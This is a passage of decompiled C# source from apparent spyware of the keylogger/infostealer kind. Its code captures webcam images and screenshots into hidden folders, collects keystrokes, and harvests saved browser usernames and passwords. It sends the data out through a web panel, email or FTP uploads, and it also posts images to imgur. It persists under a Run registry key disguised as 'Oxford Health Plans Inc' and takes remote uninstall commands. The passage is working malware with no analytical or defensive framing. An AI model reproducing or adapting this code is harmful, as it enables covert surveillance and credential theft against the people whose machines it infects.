			CQU_90 = TV("WebCap", 1342177280, 0, 0, pictureBox.Size.Width, pictureBox.Size.Height, pictureBox.Handle.ToInt32(), 0);
			if (QI(CQU_90, 1034u, 0, 0) > 0)
			{
				QI(CQU_90, 1076u, 30, 0);
				QI(CQU_90, 1074u, 1, 0);
				QI(CQU_90, 1084u, 0, 0);
				QI(CQU_90, 1054u, 0, 0);
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture"))
				{
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture");
					File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture", FileAttributes.Hidden);
				}
				System.Windows.Forms.Clipboard.GetImage().Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", ImageFormat.Jpeg);
				QI(CQU_90, 1035u, CQU_90, 0);
				DateTime now = DateTime.Now;
				string format = "MM/dd/yyyy HH:mm:ss";
				if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
				{
					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg"));
					CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "webcam", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, text, null, null, null, null, null, BU_72));
				}
				else if (Operators.CompareString(WEL_46, "smtp", false) == 0)
				{
					string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Webcam Capture From: " + GO_71;
					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
					MV("%toemail%", iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg");
				}
				else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
				{
					string format2 = "yyyy_MM_dd_HH_mm_ss";
					VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\CamCampture\webcam.jpeg", "Webcam_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".jpeg");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static ImageCodecInfo PNC(ImageFormat IC_140)
	{
		//Discarded unreachable code: IL_002f, IL_0042
		//IL_0039: Expected O, but got I4
		//IL_003a: Expected O, but got I4
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		for (int i = 0; i < imageEncoders.Length; i = checked(i + 1))
		{
			if (imageEncoders[i].FormatID == IC_140.Guid)
			{
				return imageEncoders[i];
			}
		}
		return null;
	}

	public static XmlDocument AY(string XG_141)
	{
		//Discarded unreachable code: IL_0188, IL_019a, IL_01ad
		//IL_01a4: Expected O, but got I4
		//IL_01a5: Expected O, but got I4
		try
		{
			object obj = new WebClient();
			try
			{
				string str = "3ce63074cd9dcf8";
				NewLateBinding.LateCall(NewLateBinding.LateGet(obj, null, "Headers", new object[0], null, null, null), null, "Add", new object[2]
				{
					"Authorization",
					Convert.ToString("Client-ID ") + str
				}, null, null, null, true);
				object obj2 = new NameValueCollection();
				object instance = obj2;
				string memberName = "add";
				object[] array = new object[2]
				{
					"image",
					XG_141
				};
				object[] arguments = array;
				bool[] array2 = new bool[2]
				{
					false,
					true
				};
				NewLateBinding.LateCall(instance, null, memberName, arguments, null, null, array2, true);
				if (array2[1])
				{
					XG_141 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
				}
				string memberName2 = "UploadValues";
				object[] array3 = new object[2]
				{
					"https://api.imgur.com/3/upload.xml",
					RuntimeHelpers.GetObjectValue(obj2)
				};
				object[] arguments2 = array3;
				array2 = new bool[2]
				{
					false,
					true
				};
				object obj3 = NewLateBinding.LateGet(obj, null, memberName2, arguments2, null, null, array2);
				if (array2[1])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array3[1]);
				}
				byte[] buffer = (byte[])obj3;
				XmlDocument xmlDocument = new XmlDocument();
				using (MemoryStream inStream = new MemoryStream(buffer))
				{
					xmlDocument.Load(inStream);
				}
				return xmlDocument;
			}
			finally
			{
				if (obj != null)
				{
					((IDisposable)obj).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			XmlDocument result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string BN_(string MTD_142, string ZQU_143, string UCJ_144, int _T_145)
	{
		//Discarded unreachable code: IL_002c, IL_003f
		//IL_0036: Expected O, but got I4
		//IL_0037: Expected O, but got I4
		try
		{
			string input = Regex.Split(MTD_142, ZQU_143)[checked(_T_145 + 1)];
			return Regex.Split(input, UCJ_144)[0];
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static void XT(object IM_146, ElapsedEventArgs KL_147)
	{
		//Discarded unreachable code: IL_0486, IL_0499
		//IL_0490: Expected O, but got I4
		//IL_0491: Expected O, but got I4
		try
		{
			Size blockRegionSize = new Size(W.F_4.Screen.Bounds.Width, W.F_4.Screen.Bounds.Height);
			Bitmap bitmap = new Bitmap(W.F_4.Screen.Bounds.Width, W.F_4.Screen.Bounds.Height);
			EncoderParameters encoderParameters = new EncoderParameters(1);
			System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
			ImageCodecInfo encoder = PNC(ImageFormat.Jpeg);
			EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
			encoderParameters.Param[0] = encoderParameter;
			Graphics graphics = Graphics.FromImage(bitmap);
			Point upperLeftSource = new Point(0, 0);
			Point upperLeftDestination = new Point(0, 0);
			graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot"))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot");
				File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot", FileAttributes.Hidden);
			}
			bitmap.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", encoder, encoderParameters);
			if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
			{
				if (_KJ_37)
				{
					string text = Convert.ToBase64String(File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg"));
					CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "screenshots", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, text, null, null, null, null, null, null, null, BU_72));
				}
			}
			else if (Operators.CompareString(WEL_46, "smtp", false) == 0)
			{
				DateTime now = DateTime.Now;
				string format = "MM/dd/yyyy HH:mm:ss";
				string iMW_ = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Screen Capture From: " + GO_71;
				string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>=================================================</span>";
				MV("%toemail%", iMW_, hS_, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg");
			}
			else if (Operators.CompareString(WEL_46, "ftp", false) == 0)
			{
				string format2 = "yyyy_MM_dd_HH_mm_ss";
				VEU(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", "Screenshot_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".jpeg");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static void AO(object SC_148, ElapsedEventArgs CU_149)
	{
		//Discarded unreachable code: IL_0066, IL_0079
		//IL_0070: Expected O, but got I4
		VY_36.cbSize = Marshal.SizeOf(VY_36);
		VY_36.dwTime = 0;
		SJ(ref VY_36);
		if (checked((int)Math.Round((double)(Environment.TickCount - VY_36.dwTime) / 1000.0)) > 600)
		{
			_KJ_37 = false;
		}
		else
		{
			_KJ_37 = true;
		}
	}

	private static void JX()
	{
		//Discarded unreachable code: IL_0035, IL_0048
		//IL_003f: Expected O, but got I4
		System.Timers.Timer timer = new System.Timers.Timer();
		timer.Elapsed += AO;
		timer.Enabled = true;
		timer.Interval = 1000.0;
		timer.Start();
	}

	private static void _L(object UD_150, ElapsedEventArgs CV_151)
	{
		//Discarded unreachable code: IL_0ae5, IL_0af8
		//IL_0aef: Expected O, but got I4
		//IL_0af0: Expected O, but got I4
		if (Operators.CompareString(HDM_38, "", false) == 0)
		{
			return;
		}
		DateTime now = DateTime.Now;
		string format = "MM/dd/yyyy HH:mm:ss";
		lock (HDM_38)
		{
			ES_92 += HDM_38;
			HDM_38 = "";
		}
		if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
		{
			try
			{
				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
				{
					CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "keylog", HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(File.ReadAllText(Path.GetTempPath() + "/log.tmp")), null, null, null, null, null, null, null, null, BU_72));
					File.Delete(Path.GetTempPath() + "/log.tmp");
				}
				CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "keylog", HX_68, DateTime.Now.ToString(NQW_69), LR_70, Uri.EscapeDataString(ES_92), null, null, null, null, null, null, null, null, BU_72));
				ES_92 = "";
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
				ES_92 = "";
				ProjectData.ClearProjectError();
			}
		}
		else if (Operators.CompareString(WEL_46, "smtp", false) == 0)
		{
			try
			{
				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
				{
					string iMW_ = "[Saved Log] " + SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GO_71;
					string hS_ = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span>";
					MV("%toemail%", iMW_, hS_);
					File.Delete(Path.GetTempPath() + "/log.tmp");
				}
				string iMW_2 = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GO_71;
				string hS_2 = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + "</span>";
				MV("%toemail%", iMW_2, hS_2);
				ES_92 = "";
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
				ES_92 = "";
				ProjectData.ClearProjectError();
			}
		}
		else
		{
			if (Operators.CompareString(WEL_46, "ftp", false) != 0)
			{
				return;
			}
			try
			{
				string format2 = "yyyy_MM_dd_HH_mm_ss";
				if (File.Exists(Path.GetTempPath() + "/log.tmp"))
				{
					JP("Saved_Log_From_" + LR_70.Replace("/", "-") + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span></html>");
					File.Delete(Path.GetTempPath() + "/log.tmp");
				}
				JP("Keystrokes_" + LR_70.Replace("/", "-") + "_IP_Adress_" + GO_71 + "_" + DateTime.Now.ToString(format2) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + ID(M.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + ID(M.AmountOfMemory) + "<br>VideocardName&nbsp;: " + ID(M.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + ID(M.VideocardMem) + "<br>IP Address&nbsp;&nbsp;:" + GO_71 + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + ES_92 + "</span></html>");
				ES_92 = "";
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(NQW_69) + ")]<br>" + ES_92 + "<br>");
				ES_92 = "";
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void YN(object HNL_152, ElapsedEventArgs YJP_153)
	{
		//Discarded unreachable code: IL_0090, IL_00a3
		//IL_009a: Expected O, but got I4
		//IL_009b: Expected O, but got I4
		try
		{
			CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "update", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void HD_()
	{
		//Discarded unreachable code: IL_0090, IL_00a3
		//IL_009a: Expected O, but got I4
		//IL_009b: Expected O, but got I4
		try
		{
			CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "update", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ER()
	{
		//Discarded unreachable code: IL_0098, IL_00ab
		//IL_00a2: Expected O, but got I4
		//IL_00a3: Expected O, but got I4
		try
		{
			DateTime now = DateTime.Now;
			CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "info", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, null, null, null, null, BU_72));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private static void JY(object JII_154, ElapsedEventArgs WD_155)
	{
		//Discarded unreachable code: IL_0124, IL_0137
		//IL_012e: Expected O, but got I4
		//IL_012f: Expected O, but got I4
		try
		{
			string text = CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "uninstall", HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
			if (text.Contains("uninstall"))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Oxford Health Plans Inc");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Delete(MW_60);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					_Q();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				Application.Exit();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public static void ZM()
	{
		//Discarded unreachable code: IL_0124, IL_0137
		//IL_012e: Expected O, but got I4
		//IL_012f: Expected O, but got I4
		try
		{
			string text = CC(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
client={8}
link={9}
username={10}
password={11}
screen_link={12}
site_username={13}", "uninstall", HX_68, null, null, null, null, null, null, null, null, null, null, null, BU_72));
			if (text.Contains("uninstall"))
			{
				try
				{
					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Windows", true).DeleteValue("Load");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				try
				{
					Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("Oxford Health Plans Inc");
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				try
				{
					File.Delete(MW_60);
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				try
				{
					_Q();
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
				Application.Exit();
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	public static void JP(string H__156, string WZN_157)
	{
		//Discarded unreachable code: IL_0169, IL_017c
		//IL_0173: Expected O, but got I4
		//IL_0174: Expected O, but got I4
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("%ftphost%/" + H__156);
			ftpWebRequest.Credentials = new NetworkCredential("%ftpuser%", "%ftppassword%");
			ftpWebRequest.Method = "STOR";
			object bytes = Encoding.UTF8.GetBytes(WZN_157);
			ftpWebRequest.ContentLength = Conversions.ToLong(NewLateBinding.LateGet(bytes, null, "Length", new object[0], null, null, null));
			object requestStream = ftpWebRequest.GetRequestStream();
			string memberName = "Write";
			object[] array = new object[3]
			{
				RuntimeHelpers.GetObjectValue(bytes),
				0,
				null
			};
			object instance = bytes;
			array[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null));
			object[] array2 = array;
			bool[] array3 = new bool[3]
			{
				true,
				false,
				true
			};
			NewLateBinding.LateCall(requestStream, null, memberName, array2, null, null, array3, true);
			if (array3[0])
			{
				bytes = RuntimeHelpers.GetObjectValue(array2[0]);
			}
			if (array3[2])
			{
				NewLateBinding.LateSetComplex(instance, null, "Length", new object[1]
				{
					RuntimeHelpers.GetObjectValue(array2[2])
				}, null, null, true, false);
			}
			NewLateBinding.LateCall(requestStream, null, "Close", new object[0], null, null, null, true);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void VEU(string J_T_158, string TGO_159)
	{
		//Discarded unreachable code: IL_0080, IL_0093
		//IL_008a: Expected O, but got I4
		//IL_008b: Expected O, but got I4
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("%ftphost%/" + TGO_159);
			ftpWebRequest.Credentials = new NetworkCredential("%ftpuser%", "%ftppassword%");
			ftpWebRequest.Method = "STOR";
			byte[] array = File.ReadAllBytes(J_T_158);
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void EH()
	{
		//Discarded unreachable code: IL_3f07, IL_3f1a
		//IL_3f11: Expected O, but got I4
		//IL_3f12: Expected O, but got I4
		DateTime now = DateTime.Now;
		string format = "MM/dd/yyyy HH:mm:ss";
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2 = new StringBuilder();
		stringBuilder2.Append(string.Format(@"type={0}
hwid={1}
time={2}
pcname={3}
logdata={4}
screen={5}
ipadd={6}
webcam_link={7}
screen_link={8}
site_username={9}
[passwords]", "passwords", HX_68, DateTime.Now.ToString(NQW_69), LR_70, null, null, null, null, null, BU_72));
		try
		{
			object obj = AEM.JHE();
			if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj, null, "Count", new object[0], null, null, null), 0, false))
			{
				IEnumerator enumerator = default(IEnumerator);
				try
				{
					enumerator = ((IEnumerable)obj).GetEnumerator();
					while (enumerator.MoveNext())
					{
						JK jK = (JK)enumerator.Current;
						string browser = jK.NP_115;
						string uRL = jK.WE_114;
						string userName = jK.ECS_112;
						string password = jK.GA_113;
						if (((uRL.Length > 1) | (browser.Length > 1)) & (userName.Length > 1) & (password.Length > 1))
						{
							if (Operators.CompareString(WEL_46, "webpanel", false) == 0)
							{
								stringBuilder2.Append(string.Format(@"
client[]={0}
link[]={1}
username[]={2}
password[]={3}", browser, uRL, Uri.EscapeDataString(userName), Uri.EscapeDataString(password)));
							}
							else if ((Operators.CompareString(WEL_46, "smtp", false) == 0) | (Operators.CompareString(WEL_46, "ftp", false) == 0))
							{
								stringBuilder.AppendLine("<br>");
								stringBuilder.AppendLine("URL:      " + uRL + "<br>");
								stringBuilder.AppendLine("Username: " + userName + "<br>");
								stringBuilder.AppendLine("Password: " + password + "<br>");
								stringBuilder.AppendLine("Application: " + browser + "<br>");
							}
						}
					}
				}
				finally
				{
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
